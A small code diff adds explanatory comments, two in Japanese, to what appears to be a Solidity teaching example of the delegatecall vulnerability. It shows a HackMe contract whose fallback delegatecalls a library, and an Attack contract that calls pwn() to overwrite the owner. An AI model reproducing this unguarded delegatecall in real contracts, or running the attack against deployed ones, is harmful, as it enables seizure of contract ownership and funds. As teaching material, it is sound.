@@ -43,6 +43,8 @@ contract HackMe {
     }
 
     fallback() external payable {
+        // delegatecall により libコントラクトのメソッドを読んで owner アドレスの情報を更新する。
+        // このアドレスのownerアドレスが変えられてしまう。
         address(lib).delegatecall(msg.data);
     }
 }
@@ -55,6 +57,7 @@ contract Attack {
     }
 
     function attack() public {
+        // delegate call pwn() method
         hackMe.call(abi.encodeWithSignature("pwn()"));
     }
 }
